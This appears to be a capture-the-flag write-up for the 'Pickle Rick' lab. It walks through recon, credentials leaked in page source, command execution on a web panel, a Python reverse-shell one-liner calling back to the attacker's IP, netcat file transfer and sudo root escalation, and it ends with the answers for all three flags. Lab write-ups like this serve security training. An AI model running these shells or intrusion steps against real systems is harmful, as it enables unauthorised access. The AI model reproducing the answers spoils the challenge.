# Pickle Rick

_This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle._

_Attack machine = 10.10.9.177_

## Reconnaisance

- Run a nmap scan to check for open ports and service information

`nmap -sC -sV oN nmap-scan 10.10.9.177`

- Run a gobuster scan to find web pages

`gobuster dir -u http://10.10.9.177 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py`

- Inspecting webpage shows a comment __Note to self, remember username! Username: R1ckRul3s__
- Found a robot.txt page and found __Wubbalubbadubdub__
- Found a login.php page. Used __R1ckRul3s__ and __Wubbalubbadubdub__ to login

- Looks like multiple commands can be executed on this page, but the cat command has been blocked so i can't read files with it. 

- Inspecting the page and found some base64 __Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==__
- Found that the `nl` command works and lets me read the files with line count

`nl Sup3rS3cretPickl3Ingred.txt`

## Exploit
     
- Work to get a reverse shell, can't run netcat, so tried a python shell using a one-liner from [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) (make sure to use the correct python version and IP address/Port information)

`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.109.202",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

Setup a netcat listener on your machine and then execute the above command on the page.

A shell should appear
```console
└─$ nc -lnvp 9999                                                                                                1 ⨯
listening on [any] 9999 ...
connect to [10.18.109.202] from (UNKNOWN) [10.10.9.177] 36460
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
- Search for the second ingredient
```console
$ cd /home
$ ls -la
total 16
drwxr-xr-x  4 root   root   4096 Feb 10  2019 .
drwxr-xr-x 23 root   root   4096 Oct 16 12:41 ..
drwxrwxrwx  2 root   root   4096 Feb 10  2019 rick
drwxr-xr-x  4 ubuntu ubuntu 4096 Feb 10  2019 ubuntu
$ cd rick
$ ls -la 	
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
$ nl 'second ingredients'
     1	1 jerry tear
```

## Privilege Escalation

- Use netcat to transfer linpeas over to run enumerations 

target machine - `nc -lp 1234 > lin`
my machine - `nc -w 3 10.10.9.177 1234 < linpeas.sh`

- Running linpeas we find that the user can run sudo on everything so using the following command i can escalate as root

`sudo bash`

- As root access root directory
```console
cd root
ls
3rd.txt
snap
cat 3rd.txt
3rd ingredients: fleeb juice
```

What is the first ingredient Rick needs?
**mr. meeseek hair**
Whats the second ingredient Rick needs?
**1 jerry tear**
Whats the final ingredient Rick needs?
**fleeb juice**